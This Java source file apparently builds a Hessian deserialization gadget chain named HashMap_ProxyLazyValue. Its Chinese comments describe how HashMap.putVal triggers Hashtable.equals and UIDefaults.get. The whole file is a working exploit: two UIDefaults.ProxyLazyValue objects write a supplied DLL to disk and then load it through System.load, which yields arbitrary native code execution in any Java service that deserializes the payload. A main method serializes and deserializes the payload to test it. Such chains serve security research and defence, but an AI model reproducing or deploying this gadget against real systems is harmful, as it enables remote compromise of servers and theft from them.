package com.test.gadget;

import tools.HessianTools;
import tools.IOTools;
import tools.ReflectTools;

import javax.swing.*;
import java.util.HashMap;

public class HashMap_ProxyLazyValue {
    public static void main(String[] args) throws Exception {
        byte[] bytes = IOTools.readFile("D:/1tmp/gcc/dynamic.dll");
        String filename = "D:/1tmp/111";
        Object o = writeAndLoadLib(filename, bytes);

        HessianTools.hessianDeser(HessianTools.hessianSer2bytes(o, "2"), "2");
    }

    /**
     * 写文件和加载 lib 二合一，通过 HashMap.putVal -》 HashTable.equals 触发 UIDefaults.get
     * 使用 ProxyLazyValue jdk11 也可用
     * @param fileName
     * @param content
     * @return
     * @throws Exception
     */
    public static Object writeAndLoadLib(String fileName, byte[] content) throws Exception {
        UIDefaults.ProxyLazyValue proxyLazyValue1 = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{fileName, content});
        UIDefaults.ProxyLazyValue proxyLazyValue2 = new UIDefaults.ProxyLazyValue("java.lang.System", "load", new Object[]{fileName});

        ReflectTools.setFieldValue(proxyLazyValue1, "acc", null);
        ReflectTools.setFieldValue(proxyLazyValue2, "acc", null);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", proxyLazyValue1);
        u2.put("aaa", proxyLazyValue1);

        HashMap map1 = ReflectTools.makeMap(u1, u2);

        UIDefaults u3 = new UIDefaults();
        UIDefaults u4 = new UIDefaults();
        u3.put("bbb", proxyLazyValue2);
        u4.put("bbb", proxyLazyValue2);

        HashMap map2 = ReflectTools.makeMap(u3, u4);

        HashMap map = new HashMap();
        map.put(1, map1);
        map.put(2, map2);

        return map;
    }
}
